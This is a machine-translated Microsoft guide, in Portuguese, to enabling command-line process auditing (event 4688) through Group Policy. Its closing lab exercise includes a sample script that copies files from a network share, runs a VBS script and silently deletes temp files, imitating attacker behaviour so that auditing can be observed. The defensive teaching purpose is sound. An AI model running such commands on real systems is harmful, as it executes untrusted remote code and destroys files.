---
ms.assetid: c8597cc8-bdcb-4e59-a09e-128ef5ebeaf8
title: Auditoria do processo de linha de comando
description: 
author: billmath
ms.author: billmath
manager: femila
ms.date: 05/31/2017
ms.topic: article
ms.prod: windows-server-threshold
ms.technology: identity-adds
ms.openlocfilehash: 61e7a5ca2b9c00c9976e6032bb10adb1974020b0
ms.sourcegitcommit: db290fa07e9d50686667bfba3969e20377548504
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 12/12/2017
---
# <a name="command-line-process-auditing"></a>Auditoria do processo de linha de comando

>Aplica-se a: Windows Server 2016, Windows Server 2012 R2

**Autor**: sênior Justin Turner engenheiro de escalonamento de suporte com o grupo do Windows  
  
> [!NOTE]  
> Este conteúdo foi criado por um engenheiro de suporte de cliente da Microsoft e se destina a arquitetos de sistemas que estão procurando mais profundamente explicações técnicas de recursos e soluções no Windows Server 2012 R2 de tópicos no TechNet geralmente fornecem e administradores experientes. No entanto, ele não passou os mesmos edição passos, para que a linguagem podem parecer que menos refinado que o que geralmente é encontrado no TechNet.  
  
## <a name="overview"></a>Visão geral  
  
-   O evento de auditoria de criação do processo de preexistente ID 4688 incluirá informações de auditoria para processos de linha de comando.  
  
-   Ele também registra hash SHA1/2 do executável no log de eventos do Applocker  
  
    -   Aplicativos e serviços Logs\Microsoft\Windows\AppLocker  
  
-   Habilitar por meio do GPO, mas ela é desabilitada por padrão  
  
    -   "Incluem a linha de comando em eventos de criação de processo"  
  
![auditoria de linha de comando](media/Command-line-process-auditing/GTR_ADDS_Event4688.gif)  
  
**Figura Figura SEQ \ \ \ * evento 16 árabe 4688**  
  
Examine o evento updated 4688 ID em REF _Ref366427278 \h Figura 16.  Antes de isso atualizar nenhuma das informações para **linha de comando do processo** registrado.  Devido a esse registro em log adicional agora podemos ver que não só o processo de wscript.exe foi iniciado, mas que também era usado para executar um script VB.  
  
## <a name="configuration"></a>Configuração  
Para ver os efeitos dessa atualização, você precisará habilitar as duas configurações de política.  
  
### <a name="you-must-have-audit-process-creation-auditing-enabled-to-see-event-id-4688"></a>Você deve ter habilitado para ver 4688 de ID de evento de auditoria de criação do processo de auditoria.  
Para habilitar a política de auditoria de criação de processo, edite a seguinte política de grupo:  
  
**Local de política:** configuração do computador > Políticas > configurações do Windows > configurações de segurança > Configuração avançada auditoria > monitoração detalhada  
  
**Nome da política:** criação do processo de auditoria  
  
**Suportado em:** Windows 7 e acima  
  
**Descrição/ajuda:**  
  
Esta configuração de política de segurança determina se o sistema operacional gera eventos de auditoria quando um processo é criado (iniciado) e o nome do programa ou do usuário que a criou.  
  
Esses eventos de auditoria pode ajudá-lo a entender como um computador está sendo usado e para acompanhar a atividade do usuário.  
  
Volume de eventos: baixo para médio, dependendo do uso do sistema  
  
**Padrão:** não configurada  
  
### <a name="in-order-to-see-the-additions-to-event-id-4688-you-must-enable-the-new-policy-setting-include-command-line-in-process-creation-events"></a>Para ver as adições ao evento 4688 ID, você deve habilitar a nova configuração de política: incluir a linha de comando em eventos de criação de processo  
**Tabela SEQ Table \ \ \ * Configuração de política de processo de linha de comando de 19 árabe**  
  
|Configuração de política|Detalhes|  
|------------------------|-----------|  
|**Caminho**|Criação do processo administrativo Templates\System\Audit|  
|**Configuração**|**Incluir a linha de comando em eventos de criação de processo**|  
|**Configuração padrão**|Não configurado (não habilitado)|  
|**Suportado em:**|?|  
|**Descrição**|Esta configuração de política determina quais informações são registradas em eventos de auditoria de segurança quando um novo processo foi criado.<br /><br />Essa configuração só se aplica quando a política de auditoria de criação de processo está habilitada. Se você habilitar esta configuração de política, que as informações de linha de comando para cada processo serão registradas em texto sem formatação no log de eventos de segurança como parte do evento de auditoria de criação de processo 4688, "um novo processo foi criado," em estações de trabalho e servidores em que esta configuração de política é aplicada.<br /><br />Se você desabilitar ou não definir esta configuração de política, informações de linha de comando do processo não serão incluídas em eventos de auditoria de criação de processo.<br /><br />Padrão: Não configurada<br /><br />Observação: Quando essa configuração de política for habilitada, criou qualquer usuário com acesso de ler que os eventos de segurança será capazes de ler os argumentos de linha de comando para qualquer um com êxito o processo. Argumentos de linha de comando podem conter informações confidenciais ou particulares, como senhas ou dados do usuário.|  
  
![auditoria de linha de comando](media/Command-line-process-auditing/GTR_ADDS_IncludeCLISetting.gif)  
  
Quando você usa as configurações de configuração de política de auditoria avançada, você precisa confirmar se essas configurações não foram substituídas pelas configurações de política de auditoria básica.  Evento 4719 é registrado quando as configurações são substituídas.  
  
![auditoria de linha de comando](media/Command-line-process-auditing/GTR_ADDS_Event4719.gif)  
  
O procedimento a seguir mostra como evitar conflitos, bloqueando a aplicação de quaisquer configurações de política de auditoria básica.  
  
### <a name="to-ensure-that-advanced-audit-policy-configuration-settings-are-not-overwritten"></a>Para garantir que as definições de configuração avançada de política de auditoria não foram substituídas  
![auditoria de linha de comando](media/Command-line-process-auditing/GTR_ADDS_AdvAuditPolicy.gif)  
  
1.  Abra o console de gerenciamento de política de grupo  
  
2.  Clique com botão direito a política de domínio padrão e clique em Editar.  
  
3.  Clique duas vezes em configuração do computador, clique duas vezes em políticas e, em seguida, clique duas vezes em configurações do Windows.  
  
4.  Clique duas vezes em configurações de segurança, clique duas vezes em políticas locais e, em seguida, clique em Opções de segurança.  
  
5.  Clique duas vezes em auditoria: Forçar política subcategoria configurações de auditoria (Windows Vista ou posterior) para substituir configurações de categorias de política de auditoria e, em seguida, clique em definir esta configuração de política.  
  
6.  Clique em habilitado e, em seguida, clique em Okey.  
  
## <a name="additional-resources"></a>Recursos adicionais  
[Auditoria de criação de processo](https://technet.microsoft.com/library/dd941613(v=WS.10).aspx)  
  
[Avançada de política de auditoria de segurança Step-by-Step guia](https://technet.microsoft.com/library/dd408940(v=WS.10).aspx)  
  
[AppLocker: Perguntas frequentes sobre](https://technet.microsoft.com/library/ee619725(v=ws.10).aspx)  
  
## <a name="try-this-explore-command-line-process-auditing"></a>Tente o seguinte: Explorar a auditoria do processo de linha de comando  
  
1.  Habilitar **criação do processo de auditoria** eventos e certifique-se de que a configuração de política de auditoria avançada não é sobrescrita  
  
2.  Crie um script que irá gerar alguns eventos de interesse e execute o script.  Observe os eventos.  O script usado para gerar o evento na lição tiveram a seguinte aparência:  
  
    ```  
    mkdir c:\systemfiles\temp\commandandcontrol\zone\fifthward  
    copy \\192.168.1.254\c$\hidden c:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward  
    start C:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward\ntuserrights.vbs  
    del c:\systemfiles\temp\*.* /Q  
    ```  
  
3.  Habilitar a auditoria de processo de linha de comando  
  
4.  Execute o script mesmo como antes e observar os eventos  
  


